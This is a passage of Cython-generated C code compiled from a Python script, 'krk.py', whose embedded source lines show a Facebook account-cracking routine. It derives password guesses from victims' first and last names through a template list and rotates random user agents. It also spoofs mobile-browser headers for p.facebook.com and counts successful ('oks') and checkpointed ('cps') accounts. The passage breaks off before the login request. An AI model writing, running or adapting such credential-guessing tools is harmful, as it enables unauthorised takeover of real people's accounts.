 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 */

/* Python wrapper */
static PyObject *__pyx_pw_3krk_13ffb(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_3krk_13ffb = {"ffb", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_3krk_13ffb, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_3krk_13ffb(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_names = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED const Py_ssize_t __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("ffb (wrapper)", 0);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_names,&__pyx_n_s_passlist,0};
    PyObject* values[3] = {0,0,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 344, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_names)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 344, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("ffb", 1, 3, 3, 1); __PYX_ERR(0, 344, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) kw_args--;
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 344, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("ffb", 1, 3, 3, 2); __PYX_ERR(0, 344, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "ffb") < 0)) __PYX_ERR(0, 344, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_ids = values[0];
    __pyx_v_names = values[1];
    __pyx_v_passlist = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("ffb", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 344, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("krk.ffb", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_3krk_12ffb(__pyx_self, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_3krk_12ffb(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_session = NULL;
  PyObject *__pyx_v_first = NULL;
  PyObject *__pyx_v_last = NULL;
  PyObject *__pyx_v_ps = NULL;
  PyObject *__pyx_v_ps2 = NULL;
  PyObject *__pyx_v_fikr = NULL;
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_head = NULL;
  PyObject *__pyx_v_getlog = NULL;
  PyObject *__pyx_v_idpass = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_complete = NULL;
  PyObject *__pyx_v_Sabir = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *(*__pyx_t_14)(PyObject *);
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  Py_ssize_t __pyx_t_17;
  Py_UCS4 __pyx_t_18;
  int __pyx_t_19;
  int __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("ffb", 0);

  /* "krk.py":346
 * def ffb(ids,names,passlist):
 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()             # <<<<<<<<<<<<<<
 *         session = requests.Session()
 *         try:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_loop); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_oks); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_4);
  __pyx_t_3 = 0;
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  __pyx_t_7 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_7 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_flush); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  __pyx_t_7 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_7 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_4, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":347
 *         global loop,oks,cps
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         session = requests.Session()             # <<<<<<<<<<<<<<
 *         try:
 *                 first = names.split(' ')[0]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_Session); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 347, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_7 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
      __pyx_t_7 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_2, };
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 347, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  }
  __pyx_v_session = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "krk.py":348
 *         sys.stdout.write('\r\r\033[1;37m [ZEA-XD-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 *         session = requests.Session()
 *         try:             # <<<<<<<<<<<<<<
 *                 first = names.split(' ')[0]
 *                 try:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_8);
    __Pyx_XGOTREF(__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_10);
    /*try:*/ {

      /* "krk.py":349
 *         session = requests.Session()
 *         try:
 *                 first = names.split(' ')[0]             # <<<<<<<<<<<<<<
 *                 try:
 *                         last = names.split(' ')[1]
 */
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_2 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
          __pyx_t_7 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_kp_s__22};
        __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 349, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      }
      __pyx_t_4 = __Pyx_GetItemInt(__pyx_t_1, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_v_first = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "krk.py":350
 *         try:
 *                 first = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         last = names.split(' ')[1]
 *                 except:
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          /* "krk.py":351
 *                 first = names.split(' ')[0]
 *                 try:
 *                         last = names.split(' ')[1]             # <<<<<<<<<<<<<<
 *                 except:
 *                         last = 'Khan'
 */
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = NULL;
          __pyx_t_7 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_7 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_kp_s__22};
            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 351, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_4, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 351, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_v_last = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "krk.py":350
 *         try:
 *                 first = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         last = names.split(' ')[1]
 *                 except:
 */
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L14_try_end;
        __pyx_L9_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "krk.py":352
 *                 try:
 *                         last = names.split(' ')[1]
 *                 except:             # <<<<<<<<<<<<<<
 *                         last = 'Khan'
 *                 ps = first.lower()
 */
        /*except:*/ {
          __Pyx_AddTraceback("krk.ffb", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_4, &__pyx_t_2) < 0) __PYX_ERR(0, 352, __pyx_L11_except_error)
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_4);
          __Pyx_XGOTREF(__pyx_t_2);

          /* "krk.py":353
 *                         last = names.split(' ')[1]
 *                 except:
 *                         last = 'Khan'             # <<<<<<<<<<<<<<
 *                 ps = first.lower()
 *                 ps2 = last.lower()
 */
          __Pyx_INCREF(__pyx_n_s_Khan);
          __Pyx_XDECREF_SET(__pyx_v_last, __pyx_n_s_Khan);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L10_exception_handled;
        }

        /* "krk.py":350
 *         try:
 *                 first = names.split(' ')[0]
 *                 try:             # <<<<<<<<<<<<<<
 *                         last = names.split(' ')[1]
 *                 except:
 */
        __pyx_L11_except_error:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L10_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L14_try_end:;
      }

      /* "krk.py":354
 *                 except:
 *                         last = 'Khan'
 *                 ps = first.lower()             # <<<<<<<<<<<<<<
 *                 ps2 = last.lower()
 *                 for fikr in passlist:
 */
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_first, __pyx_n_s_lower); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 354, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_1 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
          __pyx_t_7 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_1, };
        __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 354, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      }
      __pyx_v_ps = __pyx_t_2;
      __pyx_t_2 = 0;

      /* "krk.py":355
 *                         last = 'Khan'
 *                 ps = first.lower()
 *                 ps2 = last.lower()             # <<<<<<<<<<<<<<
 *                 for fikr in passlist:
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 */
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_last, __pyx_n_s_lower); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 355, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_1 = NULL;
      __pyx_t_7 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
          __pyx_t_7 = 1;
        }
      }
      {
        PyObject *__pyx_callargs[1] = {__pyx_t_1, };
        __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 355, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      }
      __pyx_v_ps2 = __pyx_t_2;
      __pyx_t_2 = 0;

      /* "krk.py":356
 *                 ps = first.lower()
 *                 ps2 = last.lower()
 *                 for fikr in passlist:             # <<<<<<<<<<<<<<
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 *                         ua=random.choice(ugen)
 */
      if (likely(PyList_CheckExact(__pyx_v_passlist)) || PyTuple_CheckExact(__pyx_v_passlist)) {
        __pyx_t_2 = __pyx_v_passlist; __Pyx_INCREF(__pyx_t_2); __pyx_t_5 = 0;
        __pyx_t_14 = NULL;
      } else {
        __pyx_t_5 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_v_passlist); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 356, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_14 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_2); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 356, __pyx_L3_error)
      }
      for (;;) {
        if (likely(!__pyx_t_14)) {
          if (likely(PyList_CheckExact(__pyx_t_2))) {
            if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_5); __Pyx_INCREF(__pyx_t_4); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 356, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_2, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_5); __Pyx_INCREF(__pyx_t_4); __pyx_t_5++; if (unlikely((0 < 0))) __PYX_ERR(0, 356, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_2, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_14(__pyx_t_2);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 356, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_fikr, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":357
 *                 ps2 = last.lower()
 *                 for fikr in passlist:
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)             # <<<<<<<<<<<<<<
 *                         ua=random.choice(ugen)
 *                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 */
        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_fikr, __pyx_n_s_replace); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 357, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_16 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_15))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_15);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_15, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_16, __pyx_n_s_First, __pyx_v_first};
          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 357, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
